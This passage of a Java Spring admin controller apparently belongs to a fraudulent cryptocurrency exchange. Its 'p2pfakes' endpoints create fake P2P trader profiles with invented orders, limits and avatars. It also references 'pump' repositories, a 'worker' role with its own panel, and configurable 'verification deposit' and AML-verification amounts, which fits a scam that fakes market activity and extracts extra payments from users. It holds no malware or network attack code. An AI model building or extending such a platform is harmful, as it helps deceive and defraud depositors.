        String facebook = String.valueOf(data.get("facebook"));
        String reddit = String.valueOf(data.get("reddit"));

        boolean listingRequestEnabled = (boolean) data.get("listing_request_enabled");
        boolean partnershipEnabled = (boolean) data.get("partnership_enabled");
        boolean twitterEnabled = (boolean) data.get("twitter_enabled");
        boolean telegramEnabled = (boolean) data.get("telegram_enabled");
        boolean instagramEnabled = (boolean) data.get("instagram_enabled");
        boolean facebookEnabled = (boolean) data.get("facebook_enabled");
        boolean redditEnabled = (boolean) data.get("reddit_enabled");

        AdminSettings adminSettings = adminSettingsRepository.findFirst();

        adminSettings.setListingRequest(listingRequest);
        adminSettings.setPartnership(partnership);
        adminSettings.setTwitter(twitter);
        adminSettings.setTelegram(telegram);
        adminSettings.setInstagram(instagram);
        adminSettings.setFacebook(facebook);
        adminSettings.setReddit(reddit);

        adminSettings.setListingRequestEnabled(listingRequestEnabled);
        adminSettings.setPartnershipEnabled(partnershipEnabled);
        adminSettings.setTwitterEnabled(twitterEnabled);
        adminSettings.setTelegramEnabled(telegramEnabled);
        adminSettings.setInstagramEnabled(instagramEnabled);
        adminSettings.setFacebookEnabled(facebookEnabled);
        adminSettings.setRedditEnabled(redditEnabled);

        adminSettingsRepository.save(adminSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editKycAccept(Map<String, Object> data) {
        String type = String.valueOf(data.get("type"));
        KycAcceptTimer kycAcceptTimer = KycAcceptTimer.getByName("TIMER_" + type.toUpperCase());
        if (kycAcceptTimer == null) {
            return ResponseEntity.badRequest().body("error");
        }

        AdminSettings adminSettings = adminSettingsRepository.findFirst();

        adminSettings.setKycAcceptTimer(kycAcceptTimer);

        adminSettingsRepository.save(adminSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editPromoSettings(Map<String, Object> data) {
        boolean formEnabled = (boolean) data.get("form");
        boolean hideEnabled = (boolean) data.get("hide");

        AdminSettings adminSettings = adminSettingsRepository.findFirst();

        adminSettings.setPromoFormEnabled(formEnabled);
        adminSettings.setPromoHideEnabled(hideEnabled);

        adminSettingsRepository.save(adminSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editDepositPageSettings(Map<String, Object> data) {
        boolean showAddressAlwaysEnabled = (boolean) data.get("show_address_always_enabled");
        boolean showQrAlwaysEnabled = (boolean) data.get("show_qr_always_enabled");

        if (showQrAlwaysEnabled && !showAddressAlwaysEnabled) {
            return ResponseEntity.badRequest().body("qr_without_address");
        }

        AdminSettings adminSettings = adminSettingsRepository.findFirst();

        adminSettings.setShowAddressAlways(showAddressAlwaysEnabled);
        adminSettings.setShowQrAlways(showQrAlwaysEnabled);

        adminSettingsRepository.save(adminSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editWorkerPanel(Map<String, Object> data) {
        boolean workerTopStats = (boolean) data.get("worker_top_stats");

        AdminSettings adminSettings = adminSettingsRepository.findFirst();

        adminSettings.setWorkerTopStats(workerTopStats);

        adminSettingsRepository.save(adminSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> addStakingPlan(Map<String, Object> data) {
        String title = (String) data.get("title");
        if (StringUtils.isBlank(title)) {
            return ResponseEntity.badRequest().body("invalid_title");
        }
        int days = (int) data.get("days");
        if (days <= 0) {
            return ResponseEntity.badRequest().body("invalid_days");
        }
        double percent = (double) data.get("percent");
        if (Double.isNaN(percent) || percent <= 0) {
            return ResponseEntity.badRequest().body("invalid_percent");
        }

        AdminStakingPlan stakingPlan = new AdminStakingPlan();
        stakingPlan.setTitle(title);
        stakingPlan.setDays(days);
        stakingPlan.setPercent(percent);

        adminStakingPlanRepository.save(stakingPlan);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> deleteStakingPlan(Map<String, Object> data) {
        long id = (long) (int) data.get("id");
        if (!adminStakingPlanRepository.existsById(id)) {
            return ResponseEntity.badRequest().body("not_found");
        }

        adminStakingPlanRepository.deleteById(id);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editFeatures(Map<String, Object> data) {
        Map<String, Boolean> features = (Map<String, Boolean>) data.get("features");
        for (Map.Entry<String, Boolean> entry : features.entrySet()) {
            AdminFeature.FeatureType featureType = Arrays.stream(AdminFeature.FeatureType.values()).filter(type -> type.name().equals(entry.getKey())).findFirst().orElse(null);
            if (featureType == null) {
                continue;
            }

            AdminFeature adminFeature = adminFeatureRepository.findByType(featureType).orElseThrow(() -> new RuntimeException("Feature with type " + featureType + " not found in database"));
            adminFeature.setEnabled(entry.getValue());

            adminFeatureRepository.save(adminFeature);
        }

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editEmailSettings(Map<String, Object> data) {
        boolean enabled = (boolean) data.get("enabled");
        boolean required = (boolean) data.get("required");

        String server = (String) data.get("server");
        if (enabled && !DataValidator.isDomainValided(server.toLowerCase())) {
            return ResponseEntity.badRequest().body("invalid_server");
        }
        int port = Integer.parseInt(String.valueOf(data.get("port")));
        if (enabled && port <= 0 || port > 65535) {
            return ResponseEntity.badRequest().body("invalid_port");
        }

        String email = String.valueOf(data.get("email")).toLowerCase();
        if (enabled && !DataValidator.isEmailValided(email)) {
            return ResponseEntity.badRequest().body("invalid_email");
        }

        String password = String.valueOf(data.get("password"));

        AdminEmailSettings adminEmailSettings = adminEmailSettingsRepository.findFirst();
        boolean validate = (!adminEmailSettings.isEnabled() && enabled) || (enabled && (!adminEmailSettings.getServer().equals(server) || adminEmailSettings.getPort() != port || !adminEmailSettings.getEmail().equals(email) || !adminEmailSettings.getPassword().equals(password)));
        if (validate && !emailService.validateEmail(server, port, email, password)) {
            return ResponseEntity.badRequest().body("connection_error");
        }

        adminEmailSettings.setServer(server);
        adminEmailSettings.setPort(port);
        adminEmailSettings.setEmail(email);
        adminEmailSettings.setPassword(password);
        adminEmailSettings.setEnabled(enabled);
        adminEmailSettings.setRequiredEnabled(required);

        adminEmailSettingsRepository.save(adminEmailSettings);

        return ResponseEntity.ok("success");
    }

    @PostMapping(value = "/settings/email")
    public ResponseEntity<String> settingsDefaultEmailController(@RequestBody Map<String, Object> data) {
        String server = (String) data.get("server");
        if (!DataValidator.isDomainValided(server.toLowerCase())) {
            return ResponseEntity.badRequest().body("invalid_server");
        }
        int port = (int) data.get("port");
        if (port <= 0 || port > 65535) {
            return ResponseEntity.badRequest().body("invalid_port");
        }

        String titleRegistration = String.valueOf(data.get("title_registration"));
        String titlePasswordRecovery = String.valueOf(data.get("title_password_recovery"));
        if (StringUtils.isBlank(titleRegistration) || StringUtils.isBlank(titlePasswordRecovery)) {
            return ResponseEntity.badRequest().body("invalid_title");
        }

        String htmlRegistration = (String) data.get("html_registration");
        String htmlPasswordRecovery = (String) data.get("html_password_recovery");
        if (StringUtils.isBlank(htmlRegistration) || StringUtils.isBlank(htmlPasswordRecovery)) {
            return ResponseEntity.badRequest().body("invalid_html");
        }

        AdminEmailSettings emailSettings = adminEmailSettingsRepository.findFirst();
        emailSettings.setRegistrationMessage(htmlRegistration);
        emailSettings.setPasswordRecoveryMessage(htmlPasswordRecovery);
        emailSettings.setRegistrationTitle(titleRegistration);
        emailSettings.setPasswordRecoveryTitle(titlePasswordRecovery);
        emailSettings.setDefaultServer(server);
        emailSettings.setDefaultPort(port);

        adminEmailSettingsRepository.save(emailSettings);

        return ResponseEntity.ok("success");
    }

    @PostMapping(value = "/settings/errors")
    public ResponseEntity<String> settingsErrorsController(@RequestBody Map<String, Object> data) {
        Map<String, String> messages = (Map<String, String>) data.get("messages");

        for (Map.Entry<String, String> entry : messages.entrySet()) {
            ErrorMessage.ErrorMessageType type = Arrays.stream(ErrorMessage.ErrorMessageType.values()).filter(messageType -> messageType.name().equals(entry.getKey())).findFirst().orElse(null);
            if (type == null) {
                continue;
            }

            AdminErrorMessage errorMessage = adminErrorMessageRepository.findByType(type).orElseThrow(() -> new RuntimeException("Error message with type " + type + " not found in database"));
            errorMessage.setMessage(XSSUtils.sanitize(entry.getValue()));

            adminErrorMessageRepository.save(errorMessage);
        }

        return ResponseEntity.ok("success");
    }
    //end main settings

    //start support preset settings
    @PostMapping(value = "/settings/presets")
    public ResponseEntity<String> settingsPresetsController(@RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "EDIT_SUPPORT_PRESET_SETTINGS" -> {
                return editSupportPresetSettings(data);
            }
            case "ADD_SUPPORT_PRESET" -> {
                return addSupportPreset(data);
            }
            case "DELETE_SUPPORT_PRESET" -> {
                return deleteSupportPreset(data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> editSupportPresetSettings(Map<String, Object> data) {
        boolean enabled = (boolean) data.get("enabled");

        List<Map<String, Object>> presets = (List<Map<String, Object>>) data.get("presets");
        for (Map<String, Object> preset : presets) {
            long id = Long.parseLong(String.valueOf(preset.get("id")));
            String title = String.valueOf(preset.get("title"));
            title = XSSUtils.stripXSS(title);
            if (StringUtils.isBlank(title)) {
                return ResponseEntity.badRequest().body("invalid_title");
            }

            String message = String.valueOf(preset.get("message"));
            message = XSSUtils.stripXSS(message);
            if (StringUtils.isBlank(message) || message.length() > 2000) {
                return ResponseEntity.badRequest().body("invalid_message");
            }


            AdminSupportPreset adminSupportPreset = adminSupportPresetRepository.findById(id).orElse(null);
            if (adminSupportPreset != null) {
                adminSupportPreset.setTitle(title);
                adminSupportPreset.setMessage(message);

                adminSupportPresetRepository.save(adminSupportPreset);
            }
        }

        AdminSettings adminSettings = adminSettingsRepository.findFirst();
        adminSettings.setSupportPresetsEnabled(enabled);

        adminSettingsRepository.save(adminSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> addSupportPreset(Map<String, Object> data) {
        String title = (String) data.get("title");
        title = XSSUtils.stripXSS(title);
        if (StringUtils.isBlank(title)) {
            return ResponseEntity.badRequest().body("invalid_title");
        }

        String message = (String) data.get("message");
        message = XSSUtils.stripXSS(message);
        if (StringUtils.isBlank(message) || message.length() > 2000) {
            return ResponseEntity.badRequest().body("invalid_message");
        }

        AdminSupportPreset adminSupportPreset = new AdminSupportPreset();
        adminSupportPreset.setTitle(title);
        adminSupportPreset.setMessage(message);

        adminSupportPresetRepository.save(adminSupportPreset);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> deleteSupportPreset(Map<String, Object> data) {
        long id = (long) (int) data.get("id");
        if (!adminSupportPresetRepository.existsById(id)) {
            return ResponseEntity.badRequest().body("not_found");
        }

        adminSupportPresetRepository.deleteById(id);

        return ResponseEntity.ok("success");
    }
    //end support preset settings

    //start legals
    @PostMapping(value = "/settings/legals")
    @PreAuthorize("hasRole('ROLE_WORKER') || hasRole('ROLE_ADMIN')")
    public ResponseEntity<String> legalsController(@RequestBody Map<String, Object> data) {
        String type = (String) data.get("type");
        String html = (String) data.get("html");

        if (StringUtils.isBlank(html)) {
            return ResponseEntity.badRequest().body("invalid_html");
        }

        html = sanitizeLegals(html);

        AdminLegalSettings adminLegalSettings = adminLegalSettingsRepository.findFirst();

        switch (type) {
            case "AML" -> adminLegalSettings.setAml(html);
            case "PRIVACY-NOTICE" -> adminLegalSettings.setPrivacyNotice(html);
            case "REGULATORY" -> adminLegalSettings.setRegulatory(html);
            case "RECOVERY" -> adminLegalSettings.setRecovery(html);
            case "BENEFITS" -> adminLegalSettings.setBenefits(html);
            default -> adminLegalSettings.setTerms(html);
        }

        adminLegalSettingsRepository.save(adminLegalSettings);

        return ResponseEntity.ok("success");
    }

    public String sanitizeLegals(String legal) {
        PolicyFactory policyFactory = new HtmlPolicyBuilder()
                .allowStandardUrlProtocols()
                .allowStyling()
                .allowCommonBlockElements()
                .allowCommonInlineFormattingElements()
                .allowElements("a")
                .allowElements("table")
                .allowElements("tbody")
                .allowElements("thead")
                .allowElements("tr")
                .allowElements("td")
                .allowAttributes("href").onElements("a")
                .toFactory();
        return policyFactory.sanitize(legal);
    }
    //end legals

    //start coins
    @PostMapping(value = "/coins")
    public ResponseEntity<String> coinsController(@RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "EDIT_DEPOSIT_COINS" -> {
                return editDepositCoins(data);
            }
            case "EDIT_WITHDRAW_COINS" -> {
                return editWithdrawCoins(data);
            }
            case "DELETE_WITHDRAW_COIN" -> {
                return deleteWithdrawCoin(data);
            }
            case "EDIT_MIN_DEPOSIT" -> {
                return editMinDeposit(data);
            }
            case "EDIT_TRANSACTION_COMMISSIONS" -> {
                return editDepositCommission(data);
            }
            case "EDIT_VERIFICATION_REQUIREMENT" -> {
                return editVerificationRequirement(data);
            }
            case "EDIT_VERIFICATION_AML" -> {
                return editVerificationAml(data);
            }
            case "EDIT_MIN_VERIF" -> {
                return editMinVerif(data);
            }
            case "EDIT_MIN_WITHDRAW" -> {
                return editMinWithdraw(data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> editDepositCoins(Map<String, Object> data) {
        List<Map<String, Object>> coins = (List<Map<String, Object>>) data.get("coins");

        boolean useBtcVerifDeposit = (boolean) data.get("use_btc_verif_deposit");

        for (Map<String, Object> coin : coins) {
            String title = (String) coin.get("title");
            if (StringUtils.isBlank(title)) {
                return ResponseEntity.badRequest().body("title_is_empty");
            }

            double minDepositAmount = coin.get("min_deposit_amount") == null ? -1D : Double.parseDouble(String.valueOf(coin.get("min_deposit_amount")));
            if (minDepositAmount != -1 && minDepositAmount <= 0) {
                return ResponseEntity.badRequest().body("min_deposit_amount_error");
            }

            double verifDepositAmount = coin.get("verif_deposit_amount") == null ? 0D : Double.parseDouble(String.valueOf(coin.get("verif_deposit_amount")));
            if (verifDepositAmount < 0) {
                verifDepositAmount = 0;
            }
        }

        for (Map<String, Object> coin : coins) {
            long id = (long) (int) coin.get("id");
            AdminDepositCoin depositCoin = adminDepositCoinRepository.findById(id).orElse(null);
            if (depositCoin == null) {
                continue;
            }

            String title = (String) coin.get("title");
            double minDepositAmount = coin.get("min_deposit_amount") == null ? -1D : Double.parseDouble(String.valueOf(coin.get("min_deposit_amount")));
            double verifDepositAmount = coin.get("verif_deposit_amount") == null ? 0D : Double.parseDouble(String.valueOf(coin.get("verif_deposit_amount")));
            boolean enabled = (boolean) coin.get("enabled");

            if (useBtcVerifDeposit && verifDepositAmount <= 0 && depositCoin.getType() == CoinType.BTC) {
                return ResponseEntity.badRequest().body("use_btc_verif_deposit");
            }

            long position = -1;
            try {
                position = Long.parseLong(String.valueOf(coin.get("position")));
            } catch (Exception ex) {
                return ResponseEntity.badRequest().body("position_error");
            }

            if (depositCoin.getPosition() != position || !depositCoin.getTitle().equals(title) || depositCoin.getMinDepositAmount() != minDepositAmount || depositCoin.isEnabled() != enabled || depositCoin.getVerifDepositAmount() != verifDepositAmount) {
                depositCoin.setTitle(title);
                depositCoin.setMinDepositAmount(minDepositAmount);
                depositCoin.setVerifDepositAmount(verifDepositAmount);
                depositCoin.setEnabled(enabled);
                depositCoin.setPosition(position);

                adminDepositCoinRepository.save(depositCoin);
            }
        }

        AdminCoinSettings adminCoinSettings = adminCoinSettingsRepository.findFirst();

        if (adminCoinSettings.isUseBtcVerifDeposit() != useBtcVerifDeposit) {
            adminCoinSettings.setUseBtcVerifDeposit(useBtcVerifDeposit);

            adminCoinSettingsRepository.save(adminCoinSettings);
        }

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editWithdrawCoins(Map<String, Object> data) {
        List<Map<String, Object>> coins = (List<Map<String, Object>>) data.get("coins");

        for (Map<String, Object> coin : coins) {
            String title = (String) coin.get("title");
            if (StringUtils.isBlank(title)) {
                return ResponseEntity.badRequest().body("title_is_empty");
            }
        }

        for (Map<String, Object> coin : coins) {
            long id = (long) (int) coin.get("id");
            Coin withdrawCoin = coinRepository.findById(id).orElse(null);
            if (withdrawCoin == null) {
                continue;
            }

            String title = (String) coin.get("title");
            boolean memo = (boolean) coin.get("memo");
            long position = -1;
            try {
                position = Long.parseLong(String.valueOf(coin.get("position")));
            } catch (Exception ex) {
                return ResponseEntity.badRequest().body("position_error");
            }

            if (withdrawCoin.getPosition() != position || !withdrawCoin.getTitle().equals(title) || withdrawCoin.isMemo() != memo) {
                withdrawCoin.setTitle(title);
                withdrawCoin.setMemo(memo);
                withdrawCoin.setPosition(position);

                coinRepository.save(withdrawCoin);
            }
        }

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> deleteWithdrawCoin(Map<String, Object> data) {
        long id = (long) (int) data.get("id");
        Coin coin = coinRepository.findById(id).orElse(null);
        if (coin == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        //test
        fastPumpRepository.deleteAllByCoin(coin);
        stablePumpRepository.deleteAllByCoin(coin);
        userStakingRepository.deleteAllByCoin(coin);
        withdrawCoinLimitRepository.deleteAllByCoin(coin);
        workerSettingsRepository.deleteAllByCoin(coin);
        userBalanceRepository.deleteAllByCoin(coin);
        userAlertRepository.deleteAllByCoin(coin);
        promocodeRepository.deleteAllByCoin(coin);

        coinRepository.deleteById(id);
        //todo: delete from workers and users

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editMinDeposit(Map<String, Object> data) {
        double minDepositAmount = getDoubleValue(data, "min_deposit_amount");
        if (Double.isNaN(minDepositAmount) || minDepositAmount < 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        AdminCoinSettings coinSettings = adminCoinSettingsRepository.findFirst();

        coinSettings.setMinDepositAmount(minDepositAmount);

        adminCoinSettingsRepository.save(coinSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editDepositCommission(Map<String, Object> data) {
        double depositCommission = getDoubleValue(data, "deposit_commission");
        double withdrawCommission = getDoubleValue(data, "withdraw_commission");
        if (Double.isNaN(depositCommission) || depositCommission < 0 || depositCommission >= 100 ||
                Double.isNaN(withdrawCommission) || withdrawCommission < 0 || withdrawCommission >= 100) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        AdminCoinSettings coinSettings = adminCoinSettingsRepository.findFirst();

        coinSettings.setDepositCommission(depositCommission);
        coinSettings.setWithdrawCommission(withdrawCommission);

        adminCoinSettingsRepository.save(coinSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editVerificationRequirement(Map<String, Object> data) {
        boolean enabled = (boolean) data.getOrDefault("enabled", false);

        AdminCoinSettings coinSettings = adminCoinSettingsRepository.findFirst();

        coinSettings.setVerifRequirement(enabled);

        adminCoinSettingsRepository.save(coinSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editVerificationAml(Map<String, Object> data) {
        boolean enabled = (boolean) data.getOrDefault("enabled", false);

        AdminCoinSettings coinSettings = adminCoinSettingsRepository.findFirst();

        coinSettings.setVerifAml(enabled);

        adminCoinSettingsRepository.save(coinSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editMinVerif(Map<String, Object> data) {
        double minVerifAmount = getDoubleValue(data, "min_verif_amount");
        if (Double.isNaN(minVerifAmount) || minVerifAmount < 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        AdminCoinSettings coinSettings = adminCoinSettingsRepository.findFirst();

        coinSettings.setMinVerifAmount(minVerifAmount);

        adminCoinSettingsRepository.save(coinSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editMinWithdraw(Map<String, Object> data) {
        double minWithdrawAmount = getDoubleValue(data, "min_withdraw_amount");
        if (Double.isNaN(minWithdrawAmount) || minWithdrawAmount < 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        AdminCoinSettings coinSettings = adminCoinSettingsRepository.findFirst();

        coinSettings.setMinWithdrawAmount(minWithdrawAmount);

        adminCoinSettingsRepository.save(coinSettings);

        return ResponseEntity.ok("success");
    }

    @PostMapping(value = "settings/coins")
    public ResponseEntity<String> settingsCoinsController(@RequestParam("coinSymbol") String symbol, @RequestParam(value = "coinTitle") String title, @RequestParam(value = "coinPosition") String positionLine, @RequestParam(value = "coinMemo") boolean memo, @RequestParam(value = "coinIcon") MultipartFile image) {
        if (StringUtils.isBlank(symbol) || StringUtils.isBlank(title)) {
            return ResponseEntity.badRequest().body("symbol_title_error");
        }

        symbol = symbol.toUpperCase();

        if (coinRepository.existsBySymbol(symbol)) {
            return ResponseEntity.badRequest().body("already_exists");
        }

        long position = -1;
        try {
            position = Long.parseLong(positionLine);
        } catch (Exception ex) {
            return ResponseEntity.badRequest().body("position_error");
        }

        Coin coin = new Coin();
        coin.setSymbol(symbol);
        coin.setTitle(title);
        coin.setMemo(memo);
        coin.setPosition(position);

        if (image != null && image.getOriginalFilename() != null) {
            String fileName = System.currentTimeMillis() + "_" + org.springframework.util.StringUtils.cleanPath(image.getOriginalFilename());
            try {
                FileUploadUtil.saveFile(Resources.ADMIN_COIN_ICONS_DIR, fileName, image);
                coin.setIcon("../" + Resources.ADMIN_COIN_ICONS_DIR + "/" + fileName);

                coinRepository.save(coin);
            } catch (IOException e) {
                e.printStackTrace();
                return ResponseEntity.badRequest().body("upload_image_error");
            }
        }

        return ResponseEntity.ok("success");
    }

    @PostMapping(value = "settings/edit-deposit-coin")
    public ResponseEntity<String> editDepositCoinController(@RequestParam("coinId") String coinIdString, @RequestParam(value = "coinIcon") MultipartFile image) {
        long id = Long.parseLong(coinIdString);
        AdminDepositCoin coin = adminDepositCoinRepository.findById(id).orElse(null);
        if (coin == null) {
            return ResponseEntity.badRequest().body("coin_not_found");
        }

        if (image != null && image.getOriginalFilename() != null) {
            String fileName = System.currentTimeMillis() + "_" + coin.getId();
            try {
                FileUploadUtil.saveFile(Resources.ADMIN_COIN_ICONS_DIR, fileName, image);
                coin.setIcon("../" + Resources.ADMIN_COIN_ICONS_DIR + "/" + fileName);

                adminDepositCoinRepository.save(coin);
            } catch (IOException e) {
                e.printStackTrace();
                return ResponseEntity.badRequest().body("upload_image_error");
            }
        }

        return ResponseEntity.ok("success");
    }

    @PostMapping(value = "settings/edit-coin")
    public ResponseEntity<String> editCoinController(@RequestParam("coinId") String coinIdString, @RequestParam(value = "coinIcon") MultipartFile image) {
        long id = Long.parseLong(coinIdString);
        Coin coin = coinRepository.findById(id).orElse(null);
        if (coin == null) {
            return ResponseEntity.badRequest().body("coin_not_found");
        }

        if (image != null && image.getOriginalFilename() != null) {
            String fileName = System.currentTimeMillis() + "_" + coin.getId();
            try {
                FileUploadUtil.saveFile(Resources.ADMIN_COIN_ICONS_DIR, fileName, image);
                coin.setIcon("../" + Resources.ADMIN_COIN_ICONS_DIR + "/" + fileName);

                coinRepository.save(coin);
            } catch (IOException e) {
                e.printStackTrace();
                return ResponseEntity.badRequest().body("upload_image_error");
            }
        }

        return ResponseEntity.ok("success");
    }
    //end coins

    //start p2pfakes
    @PostMapping(value = "p2pfakes/add")
    public ResponseEntity<String> p2pFakesAddController(@RequestParam("username") String username, @RequestParam(value = "orders") String orders, @RequestParam(value = "limits") String limits, @RequestParam(value = "payment_method") String paymentMethod, @RequestParam(value = "avatar") MultipartFile image) {
        if (StringUtils.isBlank(username) || StringUtils.isBlank(orders) || StringUtils.isBlank(limits) || StringUtils.isBlank(paymentMethod)) {
            return ResponseEntity.badRequest().body("empty_field");
        }

        if (image != null && image.getOriginalFilename() != null) {
            String fileName = System.currentTimeMillis() + "_" + org.springframework.util.StringUtils.cleanPath(image.getOriginalFilename());
            try {
                FileUploadUtil.saveFile(Resources.P2P_AVATARS, fileName, image);

                P2PFake p2PFake = new P2PFake();
                p2PFake.setUsername(username);
                p2PFake.setOrders(orders);
                p2PFake.setLimits(limits);
                p2PFake.setPaymentMethod(paymentMethod);
                p2PFake.setAvatar("../" + Resources.P2P_AVATARS + "/" + fileName);

                p2PFakeService.save(p2PFake);
            } catch (IOException e) {
                e.printStackTrace();
                return ResponseEntity.badRequest().body("upload_image_error");
            }
        } else {
            return ResponseEntity.badRequest().body("upload_image_error");
        }

        return ResponseEntity.ok("success");
    }

    @PostMapping(value = "p2pfakes/delete")
    public ResponseEntity<String> p2pFakesDeleteController(@RequestBody Map<String, Object> body) {
        long id = Long.parseLong(String.valueOf(body.get("id")));
        if (!p2PFakeService.deleteIfExists(id)) {
            return ResponseEntity.badRequest().body("not_found");
        }

        return ResponseEntity.ok("success");
    }
    //end p2pfakes

    //start domains
    @PostMapping(value = "wallet-connect")
    public ResponseEntity<String> walletConnectController(@RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "EDIT_WALLET" -> {
                return editWallet(data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> editWallet(Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("id")));
        UserWalletConnect walletConnect = userWalletConnectRepository.findById(id).orElse(null);
        if (walletConnect == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        String type = String.valueOf(data.get("type"));
        if (type.equals("DELETE")) {
            userWalletConnectRepository.deleteById(id);
        } else if (walletConnect.getStatus() != UserWalletConnect.Status.ON_VERIFICATION) {
            return ResponseEntity.badRequest().body("reload_page");
        } else {
            if (type.equals("ACCEPT")) {
                walletConnect.setStatus(UserWalletConnect.Status.VERIFIED);
            } else {
                walletConnect.setStatus(UserWalletConnect.Status.NOT_VERIFIED);
            }

            userWalletConnectRepository.save(walletConnect);
        }

        return ResponseEntity.ok("success");
    }
    //end domains

    //start support
    @PostMapping(value = "/support")
    public ResponseEntity<String> supportController(@RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "GET_SUPPORT_USER" -> {
                return getSupportUser(data);
            }
            case "DELETE_SUPPORT_MESSAGE" -> {
                return deleteSupportMessage(data);
            }
            case "EDIT_SUPPORT_MESSAGE" -> {
                return editSupportMessage(data);
            }
            case "DELETE_SUPPORT_DIALOG" -> {
                return deleteSupportDialog(data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> getSupportUser(Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("id")));

        User user = userRepository.findById(id).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("error");
        }

        Map<String, Object> map = new HashMap<>() {{
            put("username", user.getUsername());
            put("email", user.getEmail());
            put("domain", user.getDomain());

            if (user.getProfilePhoto() != null) {
                put("profile_photo", user.getProfilePhoto());
            }

            put("online", user.isOnline());
        }};

        return ResponseEntity.ok(JsonUtil.writeJson(map));
    }

    private ResponseEntity<String> deleteSupportMessage(Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("message_id")));

        UserSupportMessage supportMessage = userSupportMessageRepository.findById(id).orElse(null);
        if (supportMessage == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        userSupportMessageRepository.deleteByIdAndUserId(id, supportMessage.getUser().getId());

        if (!supportMessage.isSupportViewed() || !supportMessage.isUserViewed()) {
            UserSupportDialog userSupportDialog = userSupportDialogRepository.findByUserId(supportMessage.getUser().getId()).orElse(null);

            if (userSupportDialog != null) {
                if (!supportMessage.isSupportViewed()) {
                    userSupportDialog.setSupportUnviewedMessages(userSupportDialog.getSupportUnviewedMessages() - 1);
                }
                if (!supportMessage.isUserViewed()) {
                    userSupportDialog.setUserUnviewedMessages(userSupportDialog.getUserUnviewedMessages() - 1);
                }

                userSupportDialogRepository.save(userSupportDialog);
            }
        }

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editSupportMessage(Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("message_id")));

        String message = String.valueOf(data.get("message"));

        if (StringUtils.isBlank(message)) {
            return ResponseEntity.badRequest().body("message_is_empty");
        }
        if (message.length() > 2000) {
            return ResponseEntity.badRequest().body("message_limit");
        }

        message = XSSUtils.stripXSS(message);

        UserSupportMessage supportMessage = userSupportMessageRepository.findById(id).orElse(null);
        if (supportMessage == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        supportMessage.setMessage(message);

        userSupportMessageRepository.save(supportMessage);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> deleteSupportDialog(Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("user_id")));

        User user = userRepository.findById(id).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        boolean ban = (boolean) data.get("ban");

        userSupportDialogRepository.deleteByUserId(id);

        userSupportMessageRepository.deleteAllByUserId(id);

        if (ban) {
            EmailBan emailBan = new EmailBan();
            emailBan.setEmail(user.getEmail());
            emailBan.setUser(user);
            emailBan.setDate(new Date());

            emailBanRepository.save(emailBan);
        }

        return ResponseEntity.ok("success");
    }

    @PostMapping(value = "support/send")
    public ResponseEntity<String> supportSendController(@RequestParam(value = "user_id") String userId, @RequestParam(value = "message", required = false) String message, @RequestParam(value = "image", required = false) MultipartFile image) {
        if (StringUtils.isBlank(message) && image == null) {
            return ResponseEntity.badRequest().body("message_is_empty");
        }

        if (cooldownService.isCooldown("admin-support")) {
            return ResponseEntity.badRequest().body("cooldown");
        }
        User user = userRepository.findById(Long.parseLong(userId)).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        if (message != null) {
            if (StringUtils.isBlank(message)) {
                return ResponseEntity.badRequest().body("message_is_empty");
            }
            if (message.length() > 2000) {
                return ResponseEntity.badRequest().body("message_limit");
            }

            message = XSSUtils.stripXSS(message);

            UserSupportMessage supportMessage = new UserSupportMessage(UserSupportMessage.Target.TO_USER, UserSupportMessage.Type.TEXT, message, false, true, user);

            createOrUpdateSupportDialog(supportMessage, user);

            userSupportMessageRepository.save(supportMessage);
        }

        if (image != null && image.getOriginalFilename() != null) {
            String fileName = user.getId() + "_" + System.currentTimeMillis() + ".png";
            try {
                FileUploadUtil.saveFile(Resources.SUPPORT_IMAGES, fileName, image);

